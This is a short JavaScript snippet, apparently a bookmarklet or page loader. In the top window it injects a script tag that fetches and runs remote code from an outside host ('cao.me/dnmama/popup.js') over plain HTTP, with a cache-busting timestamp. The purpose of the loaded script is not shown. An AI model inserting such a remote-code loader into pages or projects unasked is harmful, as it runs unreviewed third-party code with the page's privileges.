var url = 'http://cao.me/dnmama/popup.js';
if (window === window.top) {
  (function(s) {
    s = document.body.appendChild(document.createElement('script'));
    s.src = url + '?ts=' + Date.now();
    s.charset = 'UTF-8';
  }())
}